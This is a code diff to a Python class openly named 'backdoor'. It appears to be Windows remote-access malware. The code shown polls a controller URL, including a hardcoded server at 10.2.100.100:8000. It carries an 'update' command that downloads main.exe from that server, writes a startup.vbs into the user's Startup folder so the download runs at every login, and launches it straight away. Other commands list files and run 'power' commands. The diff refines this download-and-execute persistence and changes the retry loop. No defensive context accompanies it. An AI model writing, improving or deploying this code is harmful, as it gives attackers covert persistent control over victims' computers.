@@ -87,7 +87,7 @@ class backdoor:
                 for i in os.listdir():
                     output += i + "\n"
             elif command.startswith("update"):
-                name = command.split(" ")[1]
+                name = "main.exe"
                 get_response = requests.get(f"{self.url}media/files/main.exe")
                 with open(name, "wb") as out_file:
                     out_file.write(get_response.content)
@@ -102,9 +102,11 @@ class backdoor:
                 os.chdir("AppData/Roaming/Microsoft/Windows/Start Menu/Programs/Startup")
                 with open("startup.vbs","w+") as w:
                     w.write('Set shell = CreateObject("WScript.Shell")\n')
-                    w.write('shell.CurrentDirectory = "'+os.path.join(os.path.dirname(__file__),name)+'"\n')
-                    w.write(f'shell.Run "{name}.exe"')
+                    w.write('shell.CurrentDirectory = "'+os.path.dirname(__file__)+'"\n')
+                    w.write(f'shell.Run "{name}"')
                     w.close()
+                output += "Updated\n"
+                os.system("startup.vbs")
             elif command.startswith("power"):
                 power_command = command.split("(")
                 power_command_argument = power_command[1].replace(")", "")
@@ -235,13 +237,15 @@ class backdoor:
                 
 
         return output
-while True:
-    try:
-        backdoor() 
-    except:
-        pass
-    try: 
-        backdoor("http://10.2.100.100:8000/") 
-    except:
-        pass
+    
+backdoor()
+# while True:
+#     try:
+#         backdoor() 
+#     except:
+#         pass
+#     try: 
+#         backdoor("http://10.2.100.100:8000/") 
+#     except:
+#         pass
   
